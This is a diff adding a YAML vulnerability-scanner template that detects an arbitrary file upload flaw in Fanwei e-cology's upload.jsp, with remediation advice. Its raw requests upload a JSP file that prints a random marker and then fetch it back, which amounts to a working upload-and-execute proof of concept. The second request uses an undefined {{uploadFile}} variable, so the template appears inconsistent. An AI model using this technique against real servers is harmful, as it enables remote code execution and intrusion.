@@ -1,0 +1,56 @@
+id: wooyun-2014-076547
+info:
+  name: Fanwei e-cology upload.jsp Arbitrary File Upload Detection
+  author:
+  - 折跃
+  description: |-
+    Fanwei E-cology upload.jsp Arbitrary File Upload Vulnerability
+    Fanwei Collaborative Management Application Platform (e-cology) is a large enterprise collaborative management platform that integrates enterprise information portal, knowledge and document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center capabilities. e-cology can provide a series of general-purpose and industry-specific solutions.
+
+    An arbitrary file upload vulnerability exists in Fanwei E-cology. Remote attackers can exploit it to upload files and execute code.
+  severity: critical
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. On the server side, set the file upload directory as non-executable.
+    2. File type checking: it is recommended to use a whitelist approach (more reliable than a blacklist), combined with MIME type and extension checks (restricting file types via whitelist). Additionally, when processing images, use compression or resize functions that strip out any embedded HTML code.
+    3. Rename uploaded files and paths using random values so users cannot easily access files they uploaded.
+    4. Use a dedicated domain for the file server.
+    5. Validate file contents and use regular expressions to match malicious code (filtering various obfuscation techniques such as case variations and BASE64 encoding) to restrict uploads.
+    6. Fix any parsing (upload-extension) vulnerabilities that may exist on the server.
+    7. Strictly restrict uploads of files that can modify server configuration, such as .htaccess.
+    8. Hide uploaded file paths.
+    9. Promptly fix the web upload code.
+    10. Ensure there are no local file inclusion vulnerabilities.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_1==200
+    - status_code_2==200
+    - contains(body_2,verify)
+  raw:
+  - |
+    POST /tools/SWFUpload/upload.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=---------------------------17911526049915903093347900923
+
+    -----------------------------17911526049915903093347900923
+    Content-Disposition: form-data; name="test"; filename="{{fileName}}.jsp"
+    Content-Type: application/octet-stream
+
+    <%@ page import="java.util.*,java.io.*" %>
+    <%@ page import="java.io.*"%>
+    <% out.println("{{verify}}");%>
+    -----------------------------17911526049915903093347900923
+  - |
+    GET /null{{uploadFile}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+  req-condition: true
+variables:
+  fileName: '{{rand_text_alphanumeric(8,"")}}'
+  verify: '{{rand_text_alphanumeric(32,"")}}'
